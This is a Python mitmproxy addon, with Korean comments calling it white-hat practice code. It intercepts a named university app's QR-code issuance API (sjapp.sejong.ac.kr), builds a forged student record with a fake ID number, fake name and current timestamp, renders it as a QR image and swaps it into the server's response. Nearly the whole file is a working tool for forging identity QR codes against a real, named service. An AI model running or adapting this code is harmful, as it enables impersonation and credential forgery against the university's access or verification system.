import json
import time
import io
import base64
from mitmproxy import http
import qrcode

"""
🛡️ 학번/이름 변조 QR 코드 생성 실습용 mitmproxy 애드온

이 스크립트는 학교 앱의 QR 발급 API 응답을 가로채서,
우리가 조작한 학생 정보(예: 학번 99999999, 이름 홍길동)가 담긴 가짜 QR 코드를 
실시간으로 재생성하고 이를 모바일 기기로 전달하는 화이트해커 학습용 코드입니다.
"""

def response(flow: http.HTTPFlow) -> None:
    # 📌 [실습 가이드 1] 세종대 QR 발급 API 주소 지정
    target_keyword = "sjapp.sejong.ac.kr/api/secureapi/qr/generate" 
    
    if target_keyword in flow.request.pretty_url:
        print(f"\n🔍 [MitmAddon] QR 발급 요청 포착: {flow.request.pretty_url}")
        
        # 서버 응답이 정상적이고 JSON인 경우에만 처리
        if flow.response and flow.response.status_code == 200:
            content_type = flow.response.headers.get("content-type", "")
            if "application/json" in content_type:
                try:
                    # 1. 서버의 원본 응답 JSON 파싱
                    response_json = json.loads(flow.response.text)
                    
                    # 2. 우리가 원하는 가짜 사용자 정보 구성 (변조 데이터)
                    # 실제 앱이 리더기에서 파싱하는 JSON 양식 그대로 작성합니다.
                    fake_student_info = {
                        "userId": "99999999",            # 조작할 가짜 학번 (예: 99999999)
                        "name": "홍길동(변조됨)",        # 조작할 가짜 이름
                        "role": "STUDENT",
                        "timestamp": int(time.time() * 1000),  # 현재 시간의 밀리초 타임스탬프 실시간 계산!
                        "refreshKey": 0
                    }
                    
                    fake_qr_data_string = json.dumps(fake_student_info, separators=(',', ':'))
                    print(f"✍️ [MitmAddon] 주입할 가짜 QR 데이터: {fake_qr_data_string}")
                    
                    # 3. qrcode 라이브러리를 이용하여 가짜 데이터의 QR 코드 이미지 생성
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_M,
                        box_size=10,
                        border=1,
                    )
                    qr.add_data(fake_qr_data_string)
                    qr.make(fit=True)
                    
                    # 이미지를 메모리 버퍼(BytesIO)에 PNG 포맷으로 저장
                    img = qr.make_image(fill_color="black", back_color="white")
                    img_buffer = io.BytesIO()
                    img.save(img_buffer, format="PNG")
                    img_bytes = img_buffer.getvalue()
                    
                    # 4. 이미지 바이너리를 Base64 문자열로 변환
                    fake_qr_base64 = base64.b64encode(img_bytes).decode("utf-8")
                    
                    # 5. 기존 응답 JSON 구조에 맞추어 Base64 값을 치환
                    # 유저의 API 응답 구조: {"status": "success", "data": {"qrCodeImage": "BASE64..."}}
                    if "data" in response_json and "qrCodeImage" in response_json["data"]:
                        response_json["data"]["qrCodeImage"] = fake_qr_base64
                        
                        # 변조된 JSON을 다시 응답 텍스트에 반영
                        flow.response.text = json.dumps(response_json)
                        print(f"🎉 [MitmAddon] QR 코드 이미지 변조 및 주입 완료! (학번: {fake_student_info['userId']}, 이름: {fake_student_info['name']})\n")
                    else:
                        print("❌ [MitmAddon] 응답 JSON에 'data' 또는 'qrCodeImage' 키가 존재하지 않습니다.\n")
                        
                except Exception as e:
                    print(f"❌ [MitmAddon] 에러 발생: {e}\n")
            else:
                print(f"ℹ️ [MitmAddon] Content-Type이 JSON이 아닙니다. Content-Type: {content_type}\n")
